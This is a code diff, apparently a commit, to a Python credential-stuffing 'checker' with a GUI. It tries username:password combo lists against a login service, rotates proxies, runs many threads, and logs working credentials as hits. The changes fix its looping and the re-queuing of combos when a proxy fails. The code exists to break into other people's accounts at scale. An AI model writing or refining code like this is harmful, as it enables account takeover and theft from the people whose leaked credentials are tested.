@@ -5,7 +5,7 @@ import requests
 import traceback
 
 class Authenticate:
-    def __init__(self, account, proxy:dict, timeout, working, failed, output, proxies_count, remaining, proxyless):
+    def __init__(self, account:list, proxy:dict, timeout, working, failed, output, proxies_count, remaining, proxyless):
         self.account = account
         self.proxy_dict = proxy
         self.timeout = timeout/1000
@@ -44,18 +44,17 @@ class Authenticate:
             except:
                 try:
                     if res.json()['errors']['message'] == 'Invalid username' or res.json()['errors']['message'] == 'Invalid password':
-                        print(res.json())
                         self.failed.update_failed()
                         self.remaining.update_remaining()
                 except:
                     if self.proxyless == 0:
                         try:
+                            combos.append(self.account)
                             for p in range(len(proxies)):
                                 if proxies[p]['proxy'] == self.proxy_dict['proxy']:
                                     del proxies[p]
                                     self.proxies_count.update_proxies()
                                     break
-                            combos.append(self.account)
                         except:
                             self.failed.update_failed()
                             self.remaining.update_remaining()
@@ -63,7 +62,7 @@ class Authenticate:
                         self.failed.update_failed()
                         self.remaining.update_remaining()
             else:
-                self.output.insert('end', f'\n{self.account[0]}:{self.account[1]}')
+                self.output.text.insert('end', f'{self.account[0]}:{self.account[1]}\n')
                 self.remaining.update_remaining()
                 self.working.update_hits()
 
@@ -75,7 +74,6 @@ class Authenticate:
                             del proxies[p]
                             self.proxies_count.update_proxies()
                             break
-                    combos.append(self.account)
                 except:
                     self.failed.update_failed()
                     self.remaining.update_remaining()
@@ -110,7 +108,8 @@ class Checker(Authenticate):
             self.proxies_count.active_text.config(textvariable=self.proxies_count.active_text_var)
 
         self.remaining.start(len(self.combos))
-        for c in self.combos:
+        c = 0
+        while c < len(self.combos):
             if len(self.proxies) <= 0 and self.proxyless == 0:
                 self.popup((500, 50), 'Ran Out Of Proxies!')
                 break
@@ -118,10 +117,11 @@ class Checker(Authenticate):
                 if threading.active_count() < self.threads.slider.get():
                     try:
                         if self.proxyless == 0:
-                            threading.Thread(target=self.check_account, args=(c.split(':'), self.proxies[randint(0, len(self.proxies) - 1)])).start()
+                            threading.Thread(target=self.check_account, args=(self.combos[c].split(':'), self.proxies[randint(0, len(self.proxies) - 1)])).start()
+                            c+=1
                         else:
-                            print(c)
-                            threading.Thread(target=self.check_account, args=(c.split(':'), {'type':None, 'proxy':None})).start()
+                            threading.Thread(target=self.check_account, args=(self.combos[c].split(':'), {'type':None, 'proxy':None})).start()
+                            c+=1
                     except ValueError:
                         self.popup((500, 50), 'Ran Out Of Proxies!')
                         break
